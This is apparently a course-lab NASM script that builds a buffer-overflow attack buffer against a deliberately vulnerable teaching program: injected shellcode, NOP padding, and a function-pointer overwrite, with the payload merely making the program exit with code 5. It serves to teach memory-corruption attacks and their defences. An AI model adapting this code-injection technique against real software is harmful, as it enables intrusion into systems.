; Sample attack script for NASM
;  By Dr. Tyler Bletsch (Tyler.Bletsch@duke.edu) for Computer and Information Security at Duke
;
; For use with the vuln1.c vulnerable program (or any 64-bit program where a function pointer follows immediately after an exploitable buffer)
;
; This attack buffer will cause the program to exit with status code 5.
; 
; Requires knowledge of where the buffer and function pointer are in memory (see constants below), so ASLR could defeat this attack. However, on Ubuntu 18.04, it appears that ASLR doesn't affect the location of the global data region which vuln1.c uses, so ASLR isn't effective in protecting vuln1.
; Performs machine code injection into the buffer, so W^X (also known as NX support) can defeat this attack.
;

BITS 64 ; We're writing 64-bit x86 code

; Some constants representing where the buffer and the function pointer are in memory -- these can be changed as needed
%define buffer_ptr 0x555555558040  ; this attack will be written to this buffer location
%define func_ptr   0x555555558140  ; this is the function pointer located after the normal buffer which we're going to overwrite

; == BEGIN BUFFER; MACHINE CODE GOES HERE ==
mov rax, 1
mov rdi, 1
mov rdx, message_len
mov rsi, buffer_ptr+message-$$
syscall
; Set rax to syscall number 60, exit. Unlike the in-class example, we don't have to worry
; about NULL bytes being in our attack code, as gets *only* stops at a newline.
mov rax,60

; set rdi to the first parameter, the exit code, 5 in this case. 
mov rdi,5

; do the system call
; (see https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux for info on how doing system calls works (note -- that page uses AT&T syntax assembly, whereas this is Intel syntax))
; (see https://filippo.io/linux-syscall-table/ for syscall numbers (double-click a table row for parameters)
syscall

; == END OF MACHINE CODE; START OF DATA EMBEDDED IN ATTACK BUFFER ==

; here's how we store a message in the attack buffer and note its length -- this attack doesn't make use of the message though
; note that there is no null terminator automatically included in NASM strings
; you can use the message label elsewhere in code to get the offset into the attack buffer where the message is
; you can use (buffer_ptr+message-$$) to get the absolute address of the message
message db "hax0red"
; you can use the macro message_len to get the length of the message in bytes
message_len equ $-message

; == END OF DATA EMBEDDED IN ATTACK BUFFER, START OF PADDING TO END OF BUFFER ==

; Pad out until the function pointer:
; this code will output "no-op" (do nothing) instructions to the full length of the buffer we're overflowing
; the "$-$$" part means "the number of bytes emitted in this file so far", so the math is calculating size of the buffer, subtracting the bytes emitted by code above, and writing that many 1-byte nop instructions
times (func_ptr-buffer_ptr)-($-$$) nop

; == END OF BUFFER, START OF OVERFLOW INTO FUNCTION POINTER ==

; Overwrite function pointer
dq buffer_ptr

; == END OF ATTACK CODE ==
